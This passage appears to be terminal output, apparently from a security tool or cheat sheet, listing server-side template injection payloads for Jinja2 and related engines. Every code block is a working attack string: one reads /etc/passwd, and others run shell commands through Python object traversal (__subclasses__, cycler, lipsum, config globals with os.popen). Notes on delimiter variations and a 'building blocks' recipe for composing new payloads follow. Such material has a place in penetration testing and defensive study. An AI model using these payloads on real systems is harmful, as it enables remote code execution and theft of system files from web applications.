[34m│[0m **Read file:**                                                               [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}     [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Execute command:**                                                         [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m {{ ''.__class__.__mro__[2].__subclasses__()[X]('id', shell=True,             [34m│[0m
[34m│[0m stdout=-1).communicate() }}                                                  [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m Where X is the index of subprocess.Popen in __subclasses__()                 [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Using cycler:**                                                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m {{ cycler.__init__.__globals__.os.popen('id').read() }}                      [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Using lipsum:**                                                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m {{ lipsum.__globals__['os'].popen('id').read() }}                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Using config:**                                                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}         [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Template Delimiter Variations                                            [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m Jinja2: {{ }}, {% %}, {# #}                                                  [34m│[0m
[34m│[0m Twig: {{ }}, {% %}                                                           [34m│[0m
[34m│[0m Smarty: { }, {literal}                                                       [34m│[0m
[34m│[0m Freemarker: ${}, <#>                                                         [34m│[0m
[34m│[0m Velocity: $, #                                                               [34m│[0m
[34m│[0m Mako: ${}, <%, %>                                                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Building Blocks Approach                                                 [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m SSTI BUILDING BLOCKS:                                                        [34m│[0m
[34m│[0m 1. Template delimiter: {{ }}, ${ }, <% %>                                    [34m│[0m
[34m│[0m 2. Object access: literals, globals, built-ins                               [34m│[0m
[34m│[0m 3. Traversal: __class__, __mro__, __subclasses__                             [34m│[0m
[34m│[0m 4. Execution: popen(), system(), eval()                                      [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
